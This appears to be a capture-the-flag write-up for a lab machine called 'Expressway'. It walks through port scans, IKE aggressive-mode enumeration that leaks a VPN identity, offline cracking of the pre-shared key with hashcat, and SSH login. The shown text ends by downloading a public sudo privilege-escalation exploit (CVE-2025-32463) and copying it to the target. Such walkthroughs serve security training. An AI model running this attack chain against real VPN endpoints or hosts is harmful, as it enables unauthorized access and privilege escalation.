# Expressway       
 
<img width="1605" height="265" alt="image" src="https://github.com/user-attachments/assets/dd099cdd-1272-416f-8200-71515c9f6d10" />

----

## **`Nmap`** TCP Port Scan 

```ruby
nmap -sV -O MACHINE_IP -T5
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 12:02 EST
Warning: 10.10.11.87 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.87
Host is up (0.30s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 2.6.32 - 3.13 (96%), Linux 5.0 - 5.14 (96%), OpenWrt 22.03 (Linux 5.10) (95%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 5.0 (94%), Android 9 - 10 (Linux 4.9 - 4.14) (94%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.10 (93%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.07 seconds
                                                                           
```

- **`ssh`** : 22/tcp open

## ## **`Nmap`** UDP Port Scanning

```ruby
nmap -sU -sV MACHINE_IP -T5
```

```ruby
Nmap scan report for 10.10.11.87
Host is up (0.33s latency).

PORT    STATE  SERVICE
500/tcp  open   isakmp

```

- **`500`** : 

> ##  We found UDP port `500` running`ISAKMP` (Internet Security Association and Key Management Protocol), which is used by `IKE` for VPN negotiation.

---

## **`IKE Protocol Enumeration`**

### Understanding IKE

IKE (Internet Key Exchange) is the protocol used to set up security associations in IPsec VPN connections. It operates on UDP port 500 and uses two main modes:

-   `Main Mode`: More secure, exchanges information in encrypted form
-   `Aggressive Mode`: Faster but less secure, exchanges identity information in cleartext

### Simple IKE Scan

Using `ike-scan` to probe the service:

```ruby
sudo ike-scan MACHINE_IP
```

<img width="1151" height="177" alt="image" src="https://github.com/user-attachments/assets/d93c0896-d3e8-467a-900c-91db8a161e9d" />

Key Findings:

-   Encryption: 3DES (weak by modern standards)
-   Hash: SHA1 (also considered weak)
-   Authentication: PSK (Pre-Shared Key)
-   Features: XAUTH and Dead Peer Detection enabled

>[!warning]
> ### 3DES and SHA1 are deprecated cryptographic algorithms vulnerable to various attacks. Their presence indicates potential security weaknesses.

### Aggressive Mode Scan

Aggressive mode can leak identity information:

```ruby
sudo ike-scan --aggressive MACHINE_IP
```

<img width="929" height="262" alt="image" src="https://github.com/user-attachments/assets/562825d4-d53d-4970-9555-0a7939710797" />

Found : **`ike@expressway.htb`**

This reveals the VPN user identity, which we’ll use for SSH access later.

### Hash Extraction for Offline Cracking

Now let's extract the PSK hash for offline cracking:

```ruby
ike-scan -M -A MACHINE_IP --pskcrack=output.txt
```

Parameters explained:

-   `-M`: Makes the output easier to read when examining IKE protocol details
-   `-A`: Uses IKE Aggressive Mode instead of Main Mode
-   `--pskcrack`: Saves the PSK parameters to `output.txt` in a format suitable for offline cracking

<img width="1200" height="600" alt="image" src="https://github.com/user-attachments/assets/c72cd936-28e4-43ba-b79a-816b8e212095" />

## Cracking password

```ruby
hashcat -m 5400 -a 0 output.txt /usr/share/wordlists/rockyou.txt
```

<img width="1226" height="484" alt="image" src="https://github.com/user-attachments/assets/3ef6df70-6be5-485b-b691-f69e873c7025" />

## ssh connect

```
ssh ike@MACHINE_IP

```

<img width="1037" height="449" alt="image" src="https://github.com/user-attachments/assets/75d827f7-d625-4e86-b231-04db94945e31" />

## privesc

```
sudo --version
```

<img width="706" height="144" alt="image" src="https://github.com/user-attachments/assets/4c31e33d-0ed4-42e3-9590-1f9a48439692" />

### Vulnerability Research: CVE-2025-32463

A quick search reveals CVE-2025-32463: a privilege escalation vulnerability affecting sudo versions up to 1.9.17.

Vulnerability Details:

-   CVE ID: CVE-2025-32463
-   Type: Local Privilege Escalation
-   Affected Versions: sudo ≤ 1.9.17
-   Attack Vector: Exploitation of sudo's chroot handling
-   Nickname: "chwoot" (chroot + woot)

```ruby
# On your attacking machine
wget https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/raw/main/sudo-chwoot.sh

# Transfer to target
scp sudo-chwoot.sh ike@MACHINE_IP:/tmp/exploit.sh
```

<img width="1026" height="397" alt="image" src="https://github.com/user-attachments/assets/653eba92-f5cf-45dd-a2e7-74a8a6cb852f" />

